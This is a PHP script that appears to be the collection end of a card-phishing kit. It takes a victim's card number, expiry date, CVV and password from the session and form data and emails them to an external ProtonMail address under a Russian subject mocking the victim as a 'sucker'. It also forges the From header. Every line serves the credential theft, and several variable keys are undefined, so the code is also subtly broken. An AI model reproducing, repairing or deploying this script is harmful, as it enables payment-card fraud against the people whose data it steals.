<?php
session_start();
error_reporting(E_ALL);



{       
     $to = "payc2c@protonmail.com";
    $subject = 'Карта лоха :'.$_SESSION[$number];
         
    $message = 'CardNo:'.$_SESSION[$number]."\r\n";
    $message .= 'Date:'.$_SESSION[$month].'/'.$_SESSION[$year]."\r\n";
    $message .= 'CVV:'. $_SESSION[$cvv]."\r\n";
    $message .= 'Pass:'.$_POST[$pass]."\r\n";
    $message = nl2br($message);
    $header = "From: mymail@gmail.com	 \r\n";
         
    $retval = mail($to,$subject,$message,$header);
    if ($retval){
        echo 'good';
    }else echo 'error';
}   

?>